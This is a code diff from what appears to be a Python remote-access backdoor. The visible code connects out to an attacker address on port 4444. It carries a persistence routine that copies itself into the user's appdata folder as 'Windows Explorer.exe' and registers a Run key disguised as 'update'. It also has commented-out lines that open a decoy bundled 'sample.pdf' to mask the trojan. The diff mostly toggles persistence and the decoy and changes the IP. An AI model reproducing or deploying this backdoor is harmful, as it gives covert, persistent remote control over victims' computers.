@@ -9,15 +9,17 @@ import shutil
 
 class Backdoor:
     def __init__(self, ip, port):
-        self.become_persistent()
+        #self.become_persistent()
         self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.connection.connect((ip, port))
-        
+
     def become_persistent(self):
         evil_file_location = os.environ["appdata"] + "\\Windows Explorer.exe"
         if not os.path.exists(evil_file_location):
             shutil.copyfile(sys.executable, evil_file_location)
-            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + evil_file_location + '"', shell=True)
+            subprocess.call(
+                'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + evil_file_location + '"',
+                shell=True)
 
     def reliable_send(self, data):
         json_data = json.dumps(data)
@@ -71,11 +73,11 @@ class Backdoor:
 
 
 if __name__ == '__main__':
-    file_name = sys.MEIPASS + "\sample.pdf"
-    subprocess.popen(file_name, shell=True)
-    
+    #file_name = sys.MEIPASS + "\sample.pdf"
+    #subprocess.popen(file_name, shell=True)
+
     try:
-        my_backdoor = Backdoor("192.168.152.129", 4444)
+        my_backdoor = Backdoor("192.168.152.128", 4444)
         my_backdoor.run()
     except Exception:
         sys.exit()
